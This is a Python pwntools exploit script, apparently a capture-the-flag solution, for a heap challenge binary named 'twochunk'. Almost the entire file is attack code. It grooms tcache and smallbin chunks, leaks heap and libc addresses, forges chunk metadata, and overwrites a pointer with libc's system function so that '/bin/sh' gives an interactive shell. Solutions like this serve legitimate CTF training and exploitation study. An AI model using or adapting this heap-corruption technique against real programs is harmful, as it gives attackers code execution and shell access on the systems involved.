from pwn import *
context.log_level = 'debug'
prog = './twochunk'
p = process(prog)
libc = ELF("./libc.so")
  	
def add(idx, size):
	p.sendlineafter("choice: ", '1')
	p.sendlineafter("idx: ", str(idx))
	p.sendlineafter("size: ", str(size))
def edit(idx, content):
	p.sendlineafter("choice: ", '4')
	p.sendlineafter("idx: ", str(idx))
	p.sendafter("content: ", content)
def free(idx):
	p.sendlineafter("choice: ", '2')
	p.sendlineafter("idx: ", str(idx))
def show(idx):
	p.sendlineafter("choice: ", '3')
	p.sendlineafter("idx: ", str(idx))
def showmsg():
	p.sendlineafter("choice: ", '5')
def malloc(content):
	p.sendlineafter("choice: ", '6')
	p.sendafter("message: ", content)
def hack():
	p.sendlineafter("choice: ", '7')

p.sendafter("leave your name: ", p64(0x23333030-0x10)*6)
p.sendlineafter("message: ", p64(0x23333000)*6)
for i in range(6):
	add(0, 0xe9)
	free(0)
for i in range(5):
	add(0, 0x88)
	free(0)
for i in range(7):
	add(0, 0x130)
	free(0)
add(0, 0xe9)
add(1, 0x130)
free(0)

add(0, 0x100)
free(0)
add(0, 0x130)
free(1)
add(1, 0x140)
free(1)
add(1, 0xe9)

free(0)
free(1)


add(0, 0xa8)
add(1, 0xa8)
free(1)
free(0)
add(1, 0x150)
add(0, 23333)
show(0)


heap = u64(p.recv(6)+'\x00'*2)
log.info("heap ==>" + hex(heap))
edit(0, 'a'*416+p64(0)+p64(0x91)+p64(heap+0x1080)+p64(0x23333000-0x10))
free(1)
add(1, 0x88)
gdb.attach(p)
showmsg()
p.recv(0x15)
libc.address = u64(p.recvuntil('\x7f')[-6:]+'\x00'*2)-0x00007f7b2def2c60+0x7f7b2dd08000
log.info("libc.address ==>" + hex(libc.address))
payload = p64(libc.sym['system'])+'\x00'*0x28+p64(0x23333048)+p64(0)+p64(0)+'/bin/sh\x00'

malloc(payload)
#gdb.attach(p)
hack()
p.interactive()
